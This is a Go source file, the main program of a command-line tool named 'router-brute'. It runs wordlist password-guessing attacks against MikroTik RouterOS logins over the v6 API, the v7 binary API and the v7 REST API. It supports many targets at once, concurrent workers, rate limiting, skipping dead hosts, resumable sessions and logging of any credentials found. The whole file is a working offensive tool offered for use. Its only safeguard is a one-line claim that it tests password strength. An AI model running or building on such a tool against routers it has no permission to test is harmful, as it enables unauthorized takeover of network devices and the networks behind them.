package main

import (
	"context"
	"fmt"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/nimda/router-brute/internal/interfaces"

	"github.com/nimda/router-brute/internal/core"
	"github.com/nimda/router-brute/internal/modules/mikrotik/v6"
	"github.com/nimda/router-brute/internal/modules/mikrotik/v7"
	"github.com/nimda/router-brute/internal/modules/mikrotik/v7/rest"
	"github.com/nimda/router-brute/pkg/duallog"
	"github.com/rs/zerolog"
	zlog "github.com/rs/zerolog/log"
	"github.com/spf13/cobra"
)

var (
	debugMode bool
	traceMode bool
)

var rootCmd = &cobra.Command{
	Use:   "router-brute",
	Short: "Router Brute-forcing Tool",
	Long:  "This tool tests password strength on various router platforms.",
	PersistentPreRunE: func(cmd *cobra.Command, args []string) error {
		// Setup dual logging: STDOUT=complete log, STDERR=progress+success
		logLevel := zerolog.InfoLevel
		if traceMode {
			logLevel = zerolog.TraceLevel
		} else if debugMode {
			logLevel = zerolog.DebugLevel
		}
		duallog.Setup(logLevel)

		if traceMode {
			zlog.Trace().Msg("🔍🔍 TRACE MODE ENABLED")
		} else if debugMode {
			zlog.Debug().Msg("🔍 DEBUG MODE ENABLED")
		}

		// Validate common flags (skip for root command itself)
		if cmd.Name() == "router-brute" {
			return nil
		}

		target, _ := cmd.Flags().GetString("target")
		targetFile, _ := cmd.Flags().GetString("target-file")
		resumeFile, _ := cmd.Flags().GetString("resume")
		wordlist, _ := cmd.Flags().GetString("wordlist")

		// If resuming, target and wordlist are optional (loaded from resume file)
		if resumeFile != "" {
			return nil
		}

		// Normal mode validation
		if target == "" && targetFile == "" {
			return fmt.Errorf("either --target or --target-file must be specified")
		}
		if target != "" && targetFile != "" {
			return fmt.Errorf("cannot specify both --target and --target-file")
		}
		if wordlist == "" {
			return fmt.Errorf("--wordlist is required")
		}

		return nil
	},
}

var mikrotikV6Cmd = &cobra.Command{
	Use:   "mikrotik-v6",
	Short: "Brute force MikroTik RouterOS v6",
	Run:   runMikrotikV6,
}

var mikrotikV7Cmd = &cobra.Command{
	Use:   "mikrotik-v7",
	Short: "Brute force MikroTik RouterOS v7 (binary API)",
	Run:   runMikrotikV7,
}

var mikrotikV7RestCmd = &cobra.Command{
	Use:   "mikrotik-v7-rest",
	Short: "Brute force MikroTik RouterOS v7 (REST API)",
	Run:   runMikrotikV7Rest,
}

func init() {
	// Global flags (logging)
	rootCmd.PersistentFlags().BoolVar(&debugMode, "debug", false, "Enable debug logging")
	rootCmd.PersistentFlags().BoolVar(&traceMode, "trace", false, "Enable trace logging")

	// Common attack flags (shared by all protocols)
	rootCmd.PersistentFlags().String("target", "", "Router IP address or hostname")
	rootCmd.PersistentFlags().String("user", "admin", "Username to test")
	rootCmd.PersistentFlags().String("wordlist", "", "Path to password wordlist file")
	rootCmd.PersistentFlags().Int("workers", 5, "Number of concurrent workers")
	rootCmd.PersistentFlags().String("rate", "100ms", "Rate limit between attempts")
	rootCmd.PersistentFlags().String("timeout", "5s", "Connection timeout")
	rootCmd.PersistentFlags().String("max-timeout", "15s", "Maximum timeout (adaptive timeout limit)")
	rootCmd.PersistentFlags().Int("max-conseq-err-per-host", 5, "Maximum consecutive errors before marking host as dead")
	rootCmd.PersistentFlags().String("target-file", "", "File containing target specifications (multi-target mode)")
	rootCmd.PersistentFlags().Int("concurrent-targets", 1, "Number of targets to attack simultaneously")
	rootCmd.PersistentFlags().String("output-progress", "5s", "Progress statistics output interval (0 to disable)")

	// Resume functionality flags (shared by all protocols)
	rootCmd.PersistentFlags().String("resume", "", "Resume from a previous session (path to resume file)")
	rootCmd.PersistentFlags().String("save-progress", "30s", "Auto-save progress interval (0 to disable)")
	rootCmd.PersistentFlags().String("save-dir", "./resume", "Directory to save resume files")

	// Protocol-specific flags with different defaults
	mikrotikV6Cmd.Flags().Int("port", 8728, "RouterOS v6 API port")
	mikrotikV7Cmd.Flags().Int("port", 8729, "RouterOS v7 API port")
	mikrotikV7RestCmd.Flags().Int("port", 80, "RouterOS v7 REST API port")

	// Module-specific flags
	mikrotikV7RestCmd.Flags().Bool("https", false, "Use HTTPS instead of HTTP")

	// Add commands to root
	rootCmd.AddCommand(mikrotikV6Cmd)
	rootCmd.AddCommand(mikrotikV7Cmd)
	rootCmd.AddCommand(mikrotikV7RestCmd)
}

// AttackConfig holds configuration for an attack
type AttackConfig struct {
	target            string
	user              string
	wordlist          string
	workers           int
	port              int
	timeout           time.Duration
	rateLimit         time.Duration
	targetFile        string
	concurrentTargets int
	moduleFactory     func() interfaces.RouterModule
	multiFactory      interfaces.ModuleFactory

	// Resume functionality
	resumeFile              string
	saveProgressInterval    time.Duration
	saveDir                 string
	outputProgressInterval  time.Duration

	// Error handling
	maxTimeout      time.Duration
	maxConsecErrors int
}

// parseAttackConfig parses attack configuration from command flags
func parseAttackConfig(cmd *cobra.Command) *AttackConfig {
	target, _ := cmd.Flags().GetString("target")
	user, _ := cmd.Flags().GetString("user")
	wordlist, _ := cmd.Flags().GetString("wordlist")
	workers, _ := cmd.Flags().GetInt("workers")
	port, _ := cmd.Flags().GetInt("port")
	timeout, _ := cmd.Flags().GetString("timeout")
	rateLimit, _ := cmd.Flags().GetString("rate")
	targetFile, _ := cmd.Flags().GetString("target-file")
	concurrentTargets, _ := cmd.Flags().GetInt("concurrent-targets")
	resumeFile, _ := cmd.Flags().GetString("resume")
	saveProgress, _ := cmd.Flags().GetString("save-progress")
	saveDir, _ := cmd.Flags().GetString("save-dir")
	outputProgress, _ := cmd.Flags().GetString("output-progress")
	maxTimeout, _ := cmd.Flags().GetString("max-timeout")
	maxConsecErrors, _ := cmd.Flags().GetInt("max-conseq-err-per-host")

	rateDuration, err := time.ParseDuration(rateLimit)
	if err != nil {
		zlog.Fatal().Err(err).Msg("Invalid rate limit")
	}

	timeoutDuration, err := time.ParseDuration(timeout)
	if err != nil {
		zlog.Fatal().Err(err).Msg("Invalid timeout")
	}

	maxTimeoutDuration, err := time.ParseDuration(maxTimeout)
	if err != nil {
		zlog.Fatal().Err(err).Msg("Invalid max-timeout")
	}

	var saveProgressInterval time.Duration
	if saveProgress != "" && saveProgress != "0" && saveProgress != "0s" {
		saveProgressInterval, err = time.ParseDuration(saveProgress)
		if err != nil {
			zlog.Fatal().Err(err).Msg("Invalid save-progress interval")
		}
	}

	var outputProgressInterval time.Duration
	if outputProgress != "" && outputProgress != "0" && outputProgress != "0s" {
		outputProgressInterval, err = time.ParseDuration(outputProgress)
		if err != nil {
			zlog.Fatal().Err(err).Msg("Invalid output-progress interval")
		}
	}

	return &AttackConfig{
		target:                 target,
		user:                   user,
		wordlist:               wordlist,
		workers:                workers,
		port:                   port,
		timeout:                timeoutDuration,
		rateLimit:              rateDuration,
		targetFile:             targetFile,
		concurrentTargets:      concurrentTargets,
		resumeFile:             resumeFile,
		saveProgressInterval:   saveProgressInterval,
		saveDir:                saveDir,
		outputProgressInterval: outputProgressInterval,
		maxTimeout:             maxTimeoutDuration,
		maxConsecErrors:        maxConsecErrors,
	}
}

// runAttack executes an attack based on the configuration
func runAttack(cfg *AttackConfig) {
	zlog.Debug().Msg("Loading passwords from wordlist")
	passwords, err := loadPasswords(cfg.wordlist)
	if err != nil {
		zlog.Fatal().Err(err).Msg("Failed to load wordlist")
	}
	zlog.Debug().Int("n", len(passwords)).Msg("Loaded n passwords")

	if cfg.targetFile != "" {
		// Multi-target mode
		zlog.Info().Str("file", cfg.targetFile).Msg("Running in multi-target mode")
		runMultiTarget(cfg)
		return
	}

	// Single-target mode

	zlog.Info().
		Str("target", cfg.target).
		Int("passwords", len(passwords)).
		Int("workers", cfg.workers).
		Str("rate", cfg.rateLimit.String()).
		Msg("Starting attack")

	zlog.Debug().Msg("Creating module")
	module := cfg.moduleFactory()
	if err := module.Initialize(cfg.target, cfg.user, map[string]interface{}{
		"port":    cfg.port,
		"timeout": cfg.timeout,
	}); err != nil {
		zlog.Fatal().Err(err).Msg("Failed to initialize module")
	}

	// Pre-flight connection check
	zlog.Debug().Msg("Testing connection to target...")
	ctx, cancel := context.WithTimeout(context.Background(), cfg.timeout)
	if err := module.Connect(ctx); err != nil {
		cancel()
		zlog.Fatal().Err(err).Str("target", cfg.target).Int("port", cfg.port).Msg("Failed to connect to target")
	}
	cancel()
	zlog.Info().Str("target", cfg.target).Int("port", cfg.port).Msg("Connection test successful")
	// Close the test connection - workers will reconnect
	if err := module.Close(); err != nil {
		zlog.Debug().Err(err).Msg("Error closing test connection")
	}

	zlog.Debug().Int("workers", cfg.workers).Dur("ratelimit", cfg.rateLimit).Msg("Creating engine")
	engine := core.NewEngine(cfg.workers, cfg.rateLimit)
	engine.SetModule(module)
	engine.LoadPasswords(passwords)

	zlog.Debug().Msg("Starting engine...")
	if err := engine.Start(); err != nil {
		zlog.Fatal().Err(err).Msg("Failed to start engine")
	}
	zlog.Debug().Msg("Engine started successfully")

	zlog.Debug().Msg("Waiting for results...")
	successCount := 0
	totalAttempts := 0
	errorCount := 0

	// Consume errors in background
	go func() {
		for err := range engine.Errors() {
			errorCount++
			zlog.Error().Err(err).Msg("Attack error")
		}
	}()

	for result := range engine.Results() {
		totalAttempts++
		zlog.Trace().
			Int("attempt", totalAttempts).
			Str("password", result.Password).
			Dur("elapsed", result.TimeConsumed).
			Msg("Received result")

		if result.Success {
			successCount++
			zlog.Info().
				Str("username", result.Username).
				Str("password", result.Password).
				Str("target", result.Target).
				Str("module", result.ModuleName).
				Msg("✓ SUCCESS")

			zlog.Debug().Msg("Found valid credentials, stopping engine...")
			engine.Stop()
			zlog.Debug().Msg("Engine stopped")
			break
		}

		if totalAttempts%10 == 0 {
			progress := engine.Progress() * 100
			fmt.Printf("Progress: %.1f%% (%d/%d attempts)\r", progress, totalAttempts, len(passwords))
		}
	}

	zlog.Debug().
		Int("total_attempts", totalAttempts).
		Int("successes", successCount).
		Msg("Results loop completed")

	zlog.Info().Msg("Attack completed")
	zlog.Info().Int("total_attempts", totalAttempts).Msg("Total attempts")
	zlog.Info().Int("successful_attempts", successCount).Msg("Successful authentications")

	if successCount == 0 {
		zlog.Info().Msg("No valid credentials found")
	}
	zlog.Debug().Msg("Attack completed")
}

// runMultiTarget executes a multi-target attack
func runMultiTarget(cfg *AttackConfig) {
	var resumeState *core.ResumeState
	var passwords []string
	var targets []*core.Target
	var err error

	// Check if resuming from a previous session
	if cfg.resumeFile != "" {
		zlog.Info().Str("file", cfg.resumeFile).Msg("Resuming from previous session")
		resumeState, err = core.LoadResumeState(cfg.resumeFile)
		if err != nil {
			zlog.Fatal().Err(err).Msg("Failed to load resume file")
		}

		// Print resume summary
		resumeState.PrintSummary()

		// Load passwords from the file specified in resume state
		passwords, err = loadPasswords(resumeState.PasswordFile)
		if err != nil {
			zlog.Fatal().Err(err).Msg("Failed to load wordlist from resume state")
		}

		// Convert resume state targets to core.Target
		targets = make([]*core.Target, len(resumeState.Targets))
		for i, tp := range resumeState.Targets {
			targets[i] = &core.Target{
				IP:       tp.IP,
				Port:     tp.Port,
				Username: tp.Username,
			}
		}

		// Override configuration from resume state
		cfg.user = resumeState.Username
		cfg.workers = resumeState.Workers
		rateDuration, err := time.ParseDuration(resumeState.RateLimit)
		if err == nil {
			cfg.rateLimit = rateDuration
		}

		zlog.Info().
			Int("total_targets", len(targets)).
			Int("total_passwords", len(passwords)).
			Msg("Resumed session configuration")
	} else {
		// Normal mode - load from files
		zlog.Info().Str("file", cfg.targetFile).Msg("Loading targets for multi-target attack")

		// Load targets
		parser := core.NewTargetParser("", cfg.port) // Empty default command
		targets, err = parser.ParseTargetFile(cfg.targetFile)
		if err != nil {
			zlog.Fatal().Err(err).Msg("Failed to load targets")
		}

		if len(targets) == 0 {
			zlog.Fatal().Msg("No valid targets found in file")
		}

		// Load passwords
		passwords, err = loadPasswords(cfg.wordlist)
		if err != nil {
			zlog.Fatal().Err(err).Msg("Failed to load wordlist")
		}

		// Create new resume state
		resumeState = &core.ResumeState{
			Protocol:     cfg.multiFactory.GetProtocolName(),
			Username:     cfg.user,
			PasswordFile: cfg.wordlist,
			TargetFile:   cfg.targetFile,
			Workers:      cfg.workers,
			RateLimit:    cfg.rateLimit.String(),
			Targets:      make([]core.TargetProgress, len(targets)),
		}

		// Initialize target progress
		for i, target := range targets {
			resumeState.Targets[i] = core.TargetProgress{
				IP:             target.IP,
				Port:           target.Port,
				Username:       target.Username,
				PasswordsTried: 0,
				Completed:      false,
				Success:        false,
			}
		}
	}

	// Create progress tracker
	var tracker *core.ProgressTracker
	if cfg.saveProgressInterval > 0 {
		tracker = core.NewProgressTracker(resumeState, cfg.saveDir, cfg.saveProgressInterval, true)
		zlog.Info().
			Dur("interval", cfg.saveProgressInterval).
			Str("directory", cfg.saveDir).
			Msg("Progress auto-save enabled")
	}

	// Create multi-target engine
	factory := cfg.multiFactory
	engine := core.NewMultiTargetEngine(factory, cfg.workers, cfg.concurrentTargets, cfg.rateLimit)
	engine.LoadTargets(targets)
	engine.LoadPasswords(passwords)

	// Configure timeouts and error handling
	engine.SetTimeouts(cfg.timeout, cfg.maxTimeout)
	engine.SetMaxConsecutiveErrors(cfg.maxConsecErrors)

	// Set progress tracker if enabled
	if tracker != nil {
		engine.SetProgressTracker(tracker)
	}

	// Create statistics tracker
	var statsTracker *core.StatsTracker
	if cfg.outputProgressInterval > 0 {
		statsTracker = core.NewStatsTracker(len(passwords), len(targets), cfg.outputProgressInterval, tracker)
		zlog.Info().
			Dur("interval", cfg.outputProgressInterval).
			Msg("Progress statistics output enabled")
	}

	// Start attack
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Setup signal handler for Ctrl-C
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		zlog.Info().Msg("Interrupt signal received, stopping attack...")
		cancel()

		// Stop trackers
		if statsTracker != nil {
			statsTracker.Stop()
		}
		if tracker != nil {
			tracker.Stop()
			// Save current state
			if err := tracker.SaveNow(); err != nil {
				zlog.Error().Err(err).Msg("Failed to save progress on interrupt")
			}
		}

		// Generate resume command
		if tracker != nil {
			state := tracker.GetState()
			if state != nil {
				// Find most recent resume file
				resumeFile := filepath.Join(cfg.saveDir, fmt.Sprintf("resume_%s_%s.json",
					state.Protocol,
					time.Now().Format("20060102_150405")))

				// Save final state
				savedPath, err := core.SaveResumeState(state, cfg.saveDir)
				if err == nil {
					resumeFile = savedPath
				}

				// Build resume command
				resumeCmd := buildResumeCommand(state.Protocol, resumeFile, cfg)

				// Output TEXTUAL message to STDERR
				fmt.Fprintf(os.Stderr, "\n\n")
				fmt.Fprintf(os.Stderr, "========================================\n")
				fmt.Fprintf(os.Stderr, "Attack interrupted. To resume, run:\n")
				fmt.Fprintf(os.Stderr, "========================================\n")
				fmt.Fprintf(os.Stderr, "%s\n", resumeCmd)
				fmt.Fprintf(os.Stderr, "========================================\n\n")
			}
		}

		os.Exit(0)
	}()

	// Start progress tracker
	if tracker != nil {
		tracker.Start(ctx)
		defer tracker.Stop()
	}

	// Start statistics tracker
	if statsTracker != nil {
		statsTracker.Start(ctx)
		defer statsTracker.Stop()
	}

	engine.Start(ctx)

	// Process results and errors concurrently
	var wg sync.WaitGroup
	successCount := 0
	totalAttempts := 0
	targetsCompleted := 0
	errorCount := 0
	var statsLock sync.Mutex

	// Process results
	wg.Add(1)
	go func() {
		defer wg.Done()
		for result := range engine.GetResults() {
			statsLock.Lock()
			totalAttempts += result.Attempts
			targetsCompleted++

			// Calculate alive targets (non-dead)
			targetsAlive := len(targets)
			if tracker != nil {
				state := tracker.GetState()
				if state != nil {
					deadCount := 0
					for _, tp := range state.Targets {
						if tp.Dead {
							deadCount++
						}
					}
					targetsAlive = len(targets) - deadCount
				}
			}

			// Update statistics tracker
			if statsTracker != nil {
				statsTracker.UpdateProgress(totalAttempts, targetsCompleted, targetsAlive)
			}

			if result.Success {
				successCount++
			}
			statsLock.Unlock()

			if result.Success {
				zlog.Info().
					Str("target", result.Target.IP).
					Str("username", result.Target.Username).
					Str("password", result.SuccessPassword).
					Msg("✓ Found valid credentials")
			}
		}
	}()

	// Process errors
	wg.Add(1)
	go func() {
		defer wg.Done()
		for err := range engine.GetErrors() {
			zlog.Error().
				Str("target", err.Target.IP).
				Err(err.Error).
				Msg("Error during attack")
			statsLock.Lock()
			errorCount++
			statsLock.Unlock()
		}
	}()

	// Wait for all processing to complete
	wg.Wait()

	zlog.Info().
		Int("total_targets", len(targets)).
		Int("successful_targets", successCount).
		Int("failed_targets", errorCount).
		Msg("Multi-target attack completed")

	if successCount == 0 {
		zlog.Info().Msg("No valid credentials found in any target")
	}
}

// buildResumeCommand builds a command line string to resume the attack
func buildResumeCommand(protocol, resumeFile string, cfg *AttackConfig) string {
	var cmd strings.Builder
	cmd.WriteString("./router-brute ")

	// Map protocol name to command
	switch protocol {
	case "mikrotik-v6":
		cmd.WriteString("mikrotik-v6")
	case "mikrotik-v7":
		cmd.WriteString("mikrotik-v7")
	case "mikrotik-v7-rest":
		cmd.WriteString("mikrotik-v7-rest")
	default:
		cmd.WriteString(protocol)
	}

	// Add resume flag
	cmd.WriteString(" --resume=\"")
	cmd.WriteString(resumeFile)
	cmd.WriteString("\"")

	// Add other flags if they differ from defaults
	if cfg.workers != 5 {
		cmd.WriteString(fmt.Sprintf(" --workers=%d", cfg.workers))
	}
	if cfg.rateLimit != 100*time.Millisecond {
		cmd.WriteString(fmt.Sprintf(" --rate=%s", cfg.rateLimit.String()))
	}
	if cfg.timeout != 5*time.Second {
		cmd.WriteString(fmt.Sprintf(" --timeout=%s", cfg.timeout.String()))
	}
	if cfg.maxTimeout != 15*time.Second {
		cmd.WriteString(fmt.Sprintf(" --max-timeout=%s", cfg.maxTimeout.String()))
	}
	if cfg.maxConsecErrors != 5 {
		cmd.WriteString(fmt.Sprintf(" --max-conseq-err-per-host=%d", cfg.maxConsecErrors))
	}
	if cfg.concurrentTargets != 1 {
		cmd.WriteString(fmt.Sprintf(" --concurrent-targets=%d", cfg.concurrentTargets))
	}
	if cfg.saveProgressInterval > 0 {
		cmd.WriteString(fmt.Sprintf(" --save-progress=%s", cfg.saveProgressInterval.String()))
	}
	if cfg.outputProgressInterval > 0 {
		cmd.WriteString(fmt.Sprintf(" --output-progress=%s", cfg.outputProgressInterval.String()))
	}
	if cfg.saveDir != "./resume" {
		cmd.WriteString(fmt.Sprintf(" --save-dir=%s", cfg.saveDir))
	}
	if debugMode {
		cmd.WriteString(" --debug")
	}
	if traceMode {
		cmd.WriteString(" --trace")
	}

	return cmd.String()
}

func main() {
	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}

func runMikrotikV6(cmd *cobra.Command, args []string) {
	cfg := parseAttackConfig(cmd)
	cfg.moduleFactory = func() interfaces.RouterModule {
		return v6.NewMikrotikV6Module()
	}
	cfg.multiFactory = &v6.MikrotikV6Factory{}

	zlog.Debug().Msg("Starting Mikrotik v6 attack")
	runAttack(cfg)
	zlog.Debug().Msg("Mikrotik v6 attack completed")
}

func runMikrotikV7(cmd *cobra.Command, args []string) {
	cfg := parseAttackConfig(cmd)
	cfg.moduleFactory = func() interfaces.RouterModule {
		return v7.NewMikrotikV7Module()
	}
	cfg.multiFactory = &v7.MikrotikV7Factory{}

	zlog.Debug().Msg("Starting Mikrotik v7 attack")
	runAttack(cfg)
	zlog.Debug().Msg("Mikrotik v7 attack completed")
}

func runMikrotikV7Rest(cmd *cobra.Command, args []string) {
	cfg := parseAttackConfig(cmd)
	// Note: useHTTPS flag is defined but not currently used in the REST module

	cfg.moduleFactory = func() interfaces.RouterModule {
		return rest.NewMikrotikV7RestModule()
	}
	cfg.multiFactory = &rest.MikrotikV7RestFactory{}

	zlog.Debug().Msg("Starting Mikrotik v7 REST attack")
	runAttack(cfg)
	zlog.Debug().Msg("Mikrotik v7 REST attack completed")
}

func loadPasswords(filename string) ([]string, error) {
	data, err := os.ReadFile(filename)
	if err != nil {
		return nil, err
	}

	var passwords []string
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			passwords = append(passwords, line)
		}
	}
	return passwords, nil
}
